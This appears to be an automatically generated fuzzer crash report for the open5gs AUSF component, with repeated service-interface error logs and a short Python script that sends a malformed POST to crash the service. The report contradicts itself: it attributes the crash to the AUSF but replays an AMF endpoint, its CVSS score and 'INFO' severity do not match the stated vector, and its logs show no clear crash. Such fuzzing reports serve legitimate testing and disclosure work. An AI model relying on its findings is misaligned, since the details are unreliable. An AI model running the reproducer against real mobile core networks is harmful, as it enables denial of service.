# OPEN5GS-AUSF — Fuzzer-Discovered Crash Report

**Date:** 2026-05-09 00:39:36
**NF:** open5gs-ausf
**Container:** fuzzing-open5gs-ausf
**Status:** unknown
**Severity:** INFO (CVSS 5.3)
**CWE:** CWE-20 (Improper Input Validation)

---

## Summary

The open5gs-ausf crashed with exit status `unknown` during fuzzing.

## Crash Logs (key lines)

```
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.service.name[nudm-ueau] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.api.version[v1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[imsi-901700000000001:0] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[security-information:1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[generate-auth-data:2] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content_length[113] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content[{"servingNetworkName":"5G:mnc070.mcc901.3gppnetwork.org","ausfInstanceId":"32f62352-4afb-41f1-9a22-6faee92ef953"}] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m: SBI running [1] (../lib/sbi/context.c:2438)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     requester-nf-type[AUSF:5] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     service-name[nudm-ueau:6] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.method[POST] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.service.name[nudm-ueau] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.502[0m: [[33msbi[0m] [1;33mERROR[0m:     h.api.version[v1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[imsi-901700000000001:0] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[security-information:1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[generate-auth-data:2] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content_length[113] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content[{"servingNetworkName":"5G:mnc070.mcc901.3gppnetwork.org","ausfInstanceId":"32f62352-4afb-41f1-9a22-6faee92ef953"}] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m: SBI running [1] (../lib/sbi/context.c:2438)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     requester-nf-type[AUSF:5] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     service-name[nudm-ueau:6] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.method[POST] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.service.name[nudm-ueau] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.api.version[v1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[imsi-901700000000001:0] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[security-information:1] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     h.resource.component[generate-auth-data:2] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content_length[113] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m:     http.content[{"servingNetworkName":"5G:mnc070.mcc901.3gppnetwork.org","ausfInstanceId":"32f62352-4afb-41f1-9a22-6faee92ef953"}] (../lib/sbi/context.c:2440)
[32m05/08 16:39:29.503[0m: [[33msbi[0m] [1;33mERROR[0m: 27 in '&xact_pool[16384]' were not released. (../lib/sbi/context.c:105)
```

## Reproduction

```python
import http.client, json

# Last request sent before crash:
host, port = "127.0.0.1", 80
method = 'POST'
path = '/namf-comm/v1/ue-contexts/test-ue-001/n1-n2-messages'
body = b'{"n1MessageContainer": ["corrupted"], "n2InfoContainer": ["corrupted"]}'

conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f"Status: {resp.status}")
print(f"Body: {resp.read()[:500]}")
```

## Impact

- open5gs-ausf service denial (crash → restart loop)
- Potential for further exploitation of the same crash path

## CVSS 3.1

```
AV:N / AC:L / PR:N / UI:N / S:U / C:N / I:N / A:H → 5.3 (INFO)
```

---
*Auto-generated by 5g-fuzzer at 2026-05-09 00:39:36*
